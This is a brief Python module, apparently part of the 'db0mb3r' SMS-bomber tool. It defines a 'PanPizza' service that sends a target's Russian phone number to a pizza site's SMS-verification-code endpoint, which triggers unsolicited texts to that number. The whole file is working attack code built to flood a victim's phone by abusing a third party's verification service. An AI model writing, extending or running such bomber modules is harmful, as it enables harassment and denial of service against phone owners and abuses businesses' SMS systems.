from db0mb3r.services.service import Service


class PanPizza(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
            data={"telephone": "8" + self.formatted_phone[1:]},
        )
